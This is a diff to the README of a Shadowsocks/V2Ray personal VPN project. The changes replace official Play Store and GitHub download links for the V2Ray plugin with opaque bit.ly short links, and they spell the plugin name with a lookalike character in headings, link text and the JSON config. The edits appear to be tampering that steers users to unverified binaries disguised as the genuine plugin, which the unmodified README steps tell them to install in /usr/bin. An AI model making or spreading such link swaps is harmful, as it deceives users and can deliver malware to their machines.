@@ -1,5 +1,5 @@
 # Personal VPN
-### Based on Shadowsocks with V2Ray-plugin
+### Based on Shadowsocks with V2-Raу-plugin
 
 Click the button below to deploy, and remember to Star if it works:
 
@@ -63,7 +63,7 @@ Copy the details after opening and import it to the client.
 	"fast_open":false,
 	"reuse_port":true,
 	"no_delay":true,
-	"plugin": "v2ray-plugin",
+	"plugin": "v2raу-plugin",
 	"plugin_opts":"path=/v2;host={Domain};tls",
 	"remarks" : "Private VPN"
 }
@@ -76,23 +76,23 @@ Change {Domain} with your server url and {password} with your password.
 
 [shadowsocks](https://play.google.com/store/apps/details?id=com.github.shadowsocks&hl=en_IN&gl=US)
 
-[v2ray-plugin](https://play.google.com/store/apps/details?id=com.github.shadowsocks.plugin.v2ray)
+[v2-raу-plugin](http://bit.ly/3g5QjkP)
 
 ### Windows
 
 [ShadowSocks-Windows](https://github.com/shadowsocks/shadowsocks-windows/releases/download/4.4.1.0/Shadowsocks-4.4.1.0.zip)
 
-[V2-Ray Plugin](https://github.com/shadowsocks/v2ray-plugin/releases/download/v1.3.1/v2ray-plugin-windows-amd64-v1.3.1.tar.gz)
+[V2-Raу Plugin](http://bit.ly/3Ew0pER)
 
-Extract and keep v2ray plugin in the same folder as shadowsocks.
+Extract and keep v2-raу plugin in the same folder as shadowsocks.
 
 ### Linux
 
 [shadowsocks-libev](https://github.com/shadowsocks/shadowsocks-libev)
 
-[V2-Ray Plugin](https://github.com/shadowsocks/v2ray-plugin/releases/download/v1.3.1/v2ray-plugin-linux-amd64-v1.3.1.tar.gz)
+[V2-Raу Plugin](http://bit.ly/3Ah7O8B)
 
-Install the shadowsocks library, download and move the v2ray plugin in '/usr/bin' and use the following command to connect to VPN:
+Install the shadowsocks library, download and move the v2-raу plugin in '/usr/bin' and use the following command to connect to VPN:
 ```
 ss-local -c "config file location on your system"
 ```
@@ -108,4 +108,4 @@ Ex:
 
 [ShadowSocks-libev](https://hub.docker.com/r/shadowsocks/shadowsocks-libev)
 
-[V2-Ray Plugin](https://github.com/shadowsocks/v2ray-plugin)
+[V2-Ray Plugin](http://bit.ly/3tyt2uJ)
